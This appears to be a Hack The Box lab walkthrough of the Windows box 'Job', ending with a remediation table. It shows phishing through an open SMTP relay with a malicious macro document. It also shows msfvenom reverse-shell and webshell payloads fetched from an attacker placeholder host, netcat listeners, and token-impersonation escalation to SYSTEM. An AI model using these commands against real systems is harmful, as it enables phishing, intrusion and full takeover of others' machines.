<div align="center">

# 💼 HTB: Job

![OS](https://img.shields.io/badge/OS-Windows-0078D6?style=flat-square&logo=windows&logoColor=white)
![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Rooted-success?style=flat-square)

`hackthebox` `windows` `phishing` `libreoffice-macro` `iis-webroot` `seimpersonate` `printspoofer`

</div>

---

> **TL;DR** — An open SMTP relay delivers a malicious LibreOffice macro document straight to an internal mailbox, no auth required. Opening it hands over a shell. That user's group membership grants Full Control on the IIS webroot, so a webshell drop turns into code execution as the IIS AppPool — which has `SeImpersonatePrivilege` sitting there waiting for a Potato-style exploit to SYSTEM.

## 📋 Box Info

| | |
|---|---|
| 🖥️ **OS** | Windows Server 2022 (build 10.0.20348) |
| 🎯 **Target** | `<TARGET_IP>` (Job.local) |
| 🎚️ **Difficulty** | Medium |
| 📅 **Date** | December 21, 2025 |
| 🏁 **Outcome** | ✅ Full compromise |

## 🔍 Recon

```bash
nmap -sV -sC -p- <TARGET_IP> -T4 --min-rate 5000
```

| Port | Service |
|:---:|---|
| `25` | hMailServer smtpd (AUTH LOGIN advertised) |
| `80` | Microsoft IIS 10.0 |
| `445` | SMB |
| `3389` | RDP |
| `5985` | WinRM |

Five services, no obvious single point of entry — but mail servers that accept unauthenticated relay plus a web server sharing the same box is a combination worth chasing.

---

## 🚩 Shell as `jack.black` — Phishing via Open Relay

### The mail server doesn't check who's sending

```bash
swaks --to career@job.local --from yourname@job.local --server <TARGET_IP> --port 25 \
  --header "Subject: Job Application" --body "Please find my resume attached." \
  --attach msf.odt
```

```
-> MAIL FROM:yourname@job.local
<- 250 OK
-> RCPT TO:career@job.local
<- 250 OK
<- 250 Queued
```

> ⚠️ **Root cause:** the SMTP server delivers mail from any sender with zero verification (CWE-494 territory). Combined with a mail-opening human on the other end, that's a guaranteed-delivery phishing channel.

### The payload

```bash
msfconsole
use exploit/multi/misc/openoffice_document_macro
set SRVHOST <ATTACKER_IP>
set SRVPORT 1337
set LHOST <ATTACKER_IP>
run
```

This builds a malicious `.odt` with an embedded macro that, on open, downloads and runs a PowerShell payload from our HTTP server. The target's LibreOffice (7.2.x, October 2021 build) has macro execution enabled with no meaningful warning — vulnerable to the class of bug behind CVE-2017-9806.

```bash
nc -lvnp 53
```

Someone opens the attachment:

```
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 55092
PS C:\Program Files\LibreOffice\program>
```

```powershell
PS C:\Users\jack.black\Desktop> type user.txt
<USER_FLAG_REDACTED>
```

---

## 👑 Shell as `IIS AppPool\DefaultAppPool` → SYSTEM

### Group membership → webroot write access

```powershell
PS> whoami /all
job\jack.black
JOB\developers  Alias
```

```powershell
PS C:\inetpub\wwwroot> icacls .
. JOB\developers:(OI)(CI)(F)
```

`jack.black` sits in `JOB\developers`, and that group has **Full Control** on the IIS web root. Web devs needing to deploy code is normal — giving them unrestricted write access to a live, internet-facing directory is not.

### Webshell drop

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=443 -f aspx -o evil.aspx
```

```powershell
PS C:\inetpub\wwwroot> powershell iwr <ATTACKER_IP>/evil.aspx -outfile "C:\inetpub\wwwroot\evil.aspx"
```

```bash
rlwrap nc -lvnp 443
```

Browsing to `evil.aspx` triggers it:

```
c:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```

### The privilege that makes it all worthwhile

```
c:\Users>whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

> 💡 `SeImpersonatePrivilege` on a service account is the standard "Potato attack" setup — the account can impersonate any token it captures, which token-impersonation exploits (JuicyPotato, PrintSpoofer, RoguePotato, GodPotato) turn into SYSTEM.

Stage a stable Meterpreter session from the IIS context and escalate:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1597 -f exe -o evil.exe
```

```powershell
C:\Windows\Temp> powershell iwr <ATTACKER_IP>/evil.exe -outfile evil.exe
C:\Windows\Temp> .\evil.exe
```

```
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

```
meterpreter > cd C:\Users\Administrator\Desktop
meterpreter > cat root.txt
<ROOT_FLAG_REDACTED>
```

---

## ⏱️ Attack Timeline

| Time (EST) | Action | Result |
|---|---|---|
| 10:21 | Full port scan | 5 services identified |
| 10:32 | TRACE method check | Verified false positive, IIS returns 501 |
| 11:15–11:19 | Phishing delivery via open SMTP relay | Payload downloaded, opened |
| 11:16 | Reverse shell callback | Shell as `jack.black`, user flag captured |
| 11:20–11:25 | Webroot ACL discovery + webshell upload | Shell as `IIS AppPool\DefaultAppPool` |
| 11:30–11:34 | Meterpreter upload + `getsystem` | SYSTEM, root flag captured |

## 🛠️ Remediation

| Finding | Fix |
|---|---|
| Open SMTP relay | Require authentication for mail submission; deploy SPF/DKIM/DMARC. |
| Macro execution enabled by default | Set LibreOffice/Office macro security to highest level; filter executable content from attachments at the gateway. |
| `developers` group Full Control on live webroot | Deploy via CI/CD pipeline, not direct write access; grant read-only to devs on production paths. |
| `SeImpersonatePrivilege` on IIS AppPool | Disable where not strictly required; monitor for token-impersonation exploitation patterns. |
| SMB signing enabled but not required | Enforce via GPO — mitigates relay attacks on top of everything else. |

---

<div align="center">

*Part of the [D4RKGUNN3R Hack The Box Walkthroughs](../) series.*

</div>
